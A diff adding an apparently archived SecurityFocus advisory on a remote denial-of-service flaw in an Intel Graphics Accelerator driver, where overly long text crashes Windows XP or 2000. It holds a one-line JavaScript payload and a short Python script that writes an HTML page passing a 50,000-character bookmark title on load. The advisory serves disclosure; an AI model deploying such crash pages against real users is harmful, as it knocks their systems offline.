@@ -1,0 +1,31 @@
+source: http://www.securityfocus.com/bid/16127/info
+
+The Intel Graphics Accelerator driver is susceptible to a remote denial of service vulnerability. This issue is demonstrated to occur when the affected driver attempts to display an overly long text in a text area.
+
+This issue allows attackers to crash the display manager on Microsoft Windows XP, or cause a complete system crash on computers running Microsoft Windows 2000. Other operating systems where the affected display driver is available are also likely affected.
+
+Version 6.14.10.4308 of the Intel Graphics Accelerator driver is considered vulnerable to this issue. Other versions may also be affected.
+
+This issue will be updated as further information becomes available. This issue may be related to the one described in BID 10913 (Microsoft Windows Large Image Processing Remote Denial Of Service Vulnerability), but this has not been confirmed. 
+
+<script>window.open("http://aa...");</script>
+
+Where the 'a's are repeated approximately 53000 times.
+
+Casiamo <casiamo@gmail.com> has provided the following HTML script code to create an HTML file that demonstrates the exploitation of this vulnerability:
+
+html = open("firefox.html", "w")
+buff = 'A' * 50000
+html.write("<html><head>\n"
+"<script type=\"text/javascript\">\n"
+"function bookmarksite(title, url){\n"
+"if (document.all)\n"
+"window.external.AddFavorite(url, title);\n"
+"else if (window.sidebar)\n"
+"window.sidebar.addPanel(title, url, \"\")}\n"
+"</script></head>\n"
+"<body onload=\"javascript:bookmarksite('"+buff+"',
+'http://www.mozilla.org')\"
+>\n"
+"</body></html>")
+html.close() 
